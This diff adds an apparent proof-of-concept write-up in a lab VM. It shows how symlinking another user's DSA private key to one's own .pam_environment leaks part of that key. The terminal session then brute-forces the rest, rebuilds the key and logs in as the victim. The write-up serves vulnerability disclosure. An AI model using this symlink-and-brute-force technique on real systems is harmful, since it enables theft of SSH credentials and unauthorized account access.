@@ -1,0 +1,76 @@
+Over a sample of 1000 keys, 20% of DSA private keys end in '=='. Some of those
+we still can't read because their last line starts with a number; perhaps
+occurences of + and / are problematic too. I did not verify this.
+
+Of all keys ending in ==, 98% leak 16*8=128 bits of the private part ('x') of a DSA
+key. The rest (within my sample of 1000) leak 13*8=104 bits. The private part appears
+to be around 160 bits long on average.
+
+For practical purposes, I picked a key that was purely alphanumeric in the last line. I
+suspect >15% of DSA keys are suitable for this attack.
+
+
+Here follows an example 'conversation' between Alice and Eve. Code is included below that.
+
+ALICE
+
+alice@classroom:~$ ssh-keygen -t dsa
+Generating public/private dsa key pair.
+Enter file in which to save the key (/home/alice/.ssh/id_dsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/alice/.ssh/id_dsa.
+Your public key has been saved in /home/alice/.ssh/id_dsa.pub.
+The key fingerprint is:
+67:de:0c:71:72:f4:a8:13:59:22:a9:38:7a:b4:7d:6b alice@classroom
+The key's randomart image is:
++--[ DSA 1024]----+
+|        ... o    |
+|        .. = o   |
+|     . .  = + .  |
+|    + .    B     |
+|   o +  S *      |
+|  . o . .+ =     |
+|   .   . .. o    |
+|        E        |
+|       .         |
++-----------------+
+alice@classroom:~$ cd .ssh
+alice@classroom:~/.ssh$ cp id_dsa.pub authorized_keys
+
+
+EVE:
+eve@classroom:~$ ln -s /home/alice/.ssh/id_dsa .pam_environment
+eve@classroom:~$ logout
+
+Last login: Sat May 14 02:18:02 2011 from 10.0.2.2
+eve@classroom:~$ set | grep == | grep -v '^ '
+bSsUBZkPeLhzmQZtCB97Xg==
+eve@classroom:~$ cat /home/alice/.ssh/id_dsa.pub 
+ssh-dss AAAAB3NzaC1kc3MAAACBANVRS9oBaKKlLMkzNm3dc5yTW+zWTcI5yyXC3rT1OO4/bXlAmpwhi7Xf3w0lWByifoGMF7OR1b8R76CkNwDmCjXyJ8OSuOMBfsNkkbgzHSMy32djM7zvkjuiZ3nGqWsWWb+jayl/Q2en+qYZVh8JsyLr1b9C3WSBIvGpSzJOtl2PAAAAFQDIoar6gVRHZjPGDSpUvPm+U0twOQAAAIB6gi/Vj9eoLXQMZdY6Qa0dj5jeAatt+O73cpYOeCu29BwAQz7622OTv9frmoqF4MK+7GaYYKkrZfRVl4qMNZ6vF60Go+M2Yax3eAWFZ32Del6URCS6aeb/pUylkWF/TJbzyvUZ4NZ6tadjow0mrLi/p+tyLb5JjEQlCvaU28wczgAAAIEAj+JTm+IKWO5mh/fIMpxwFnpdEm/8fcfnbgFet9JOge6Y/CEMzkeLhj+tfwo8hFY3Rzhb5T2a1LeOezA/yDMM9NfoZhEi7OFX4k4tZl5ZEQ8Bzzx3KTAVRMfGGMApVONcyRGipi9jbzJW6k+F/3oJLtrSIRXV0hYNjQdNxPQHJGc= alice@classroom
+eve@classroom:~$ ./parse.py AAAAB3NzaC1kc3MAAACBANVRS9oBaKKlLMkzNm3dc5yTW+zWTcI5yyXC3rT1OO4/bXlAmpwhi7Xf3w0lWByifoGMF7OR1b8R76CkNwDmCjXyJ8OSuOMBfsNkkbgzHSMy32djM7zvkjuiZ3nGqWsWWb+jayl/Q2en+qYZVh8JsyLr1b9C3WSBIvGpSzJOtl2PAAAAFQDIoar6gVRHZjPGDSpUvPm+U0twOQAAAIB6gi/Vj9eoLXQMZdY6Qa0dj5jeAatt+O73cpYOeCu29BwAQz7622OTv9frmoqF4MK+7GaYYKkrZfRVl4qMNZ6vF60Go+M2Yax3eAWFZ32Del6URCS6aeb/pUylkWF/TJbzyvUZ4NZ6tadjow0mrLi/p+tyLb5JjEQlCvaU28wczgAAAIEAj+JTm+IKWO5mh/fIMpxwFnpdEm/8fcfnbgFet9JOge6Y/CEMzkeLhj+tfwo8hFY3Rzhb5T2a1LeOezA/yDMM9NfoZhEi7OFX4k4tZl5ZEQ8Bzzx3KTAVRMfGGMApVONcyRGipi9jbzJW6k+F/3oJLtrSIRXV0hYNjQdNxPQHJGc= bSsUBZkPeLhzmQZtCB97Xg== > data
+eve@classroom:~$ cat data
+sshpubkey='AAAAB3NzaC1kc3MAAACBANVRS9oBaKKlLMkzNm3dc5yTW+zWTcI5yyXC3rT1OO4/bXlAmpwhi7Xf3w0lWByifoGMF7OR1b8R76CkNwDmCjXyJ8OSuOMBfsNkkbgzHSMy32djM7zvkjuiZ3nGqWsWWb+jayl/Q2en+qYZVh8JsyLr1b9C3WSBIvGpSzJOtl2PAAAAFQDIoar6gVRHZjPGDSpUvPm+U0twOQAAAIB6gi/Vj9eoLXQMZdY6Qa0dj5jeAatt+O73cpYOeCu29BwAQz7622OTv9frmoqF4MK+7GaYYKkrZfRVl4qMNZ6vF60Go+M2Yax3eAWFZ32Del6URCS6aeb/pUylkWF/TJbzyvUZ4NZ6tadjow0mrLi/p+tyLb5JjEQlCvaU28wczgAAAIEAj+JTm+IKWO5mh/fIMpxwFnpdEm/8fcfnbgFet9JOge6Y/CEMzkeLhj+tfwo8hFY3Rzhb5T2a1LeOezA/yDMM9NfoZhEi7OFX4k4tZl5ZEQ8Bzzx3KTAVRMfGGMApVONcyRGipi9jbzJW6k+F/3oJLtrSIRXV0hYNjQdNxPQHJGc='
+privkeytail='bSsUBZkPeLhzmQZtCB97Xg=='
+p=(1032, 149796687392628471994012864658059469335537295262707856132318358235074089354064523385481461968125881763013291702376900313514897618578273030623730350834940405604444993867298687504690658144148660194740205460120172129540531465648472604002572050251903645892083834378966373248988577426788576214439832651880528764303L)
+q=(168, 1145403468472839477189710491941815844340807462969L)
+g=(1024, 86028424070603792456447858772625886387133344995297661824871823968572910358531836901666291003619767084845919947795814180491619516365277926348563220921790062102099090563991053901286198122690531374304511726270600882101908330097390123470873912713086882311904758513237377160877564270070634081634916077891870268622L)
+y=(1032, 101038842851724535532717336594849152481349294971477456353711494178660088567855264512123816461776186498839621163866613416858122088617380378106504834801580614713485135557092683040256193676544767001516076159179439401155728179242242995735133731247060532637714802502035774343292088483944522959145887601092303725671L)
+xtail=(128, 145109526397175623815740512749110655838L)
+increment=340282366920938463463374607431768211456L
+maximum=3366038266L
+
+
+
+eve@cluster:~$ ./farm.py data 4 host1 host2 host3 host4 host5 host6
+# 6 hours pass
+found 1114417266960240201277285122766916336093931469662
+
+eve@classroom:~$ ./out.py data 1114417266960240201277285122766916336093931469662 | openssl dsa -inform der -outform pem > .ssh/id_dsa
+read DSA key
+writing DSA key
+eve@classroom:~$ ssh-keygen -y -t dsa -f .ssh/id_dsa > .ssh/id_dsa.pub
+eve@classroom:~$ ssh alice@localhost
+Welcome to your Vagrant-built virtual machine!
+Last login: Sat May 14 08:17:53 2011 from ::1
+alice@classroom:~$
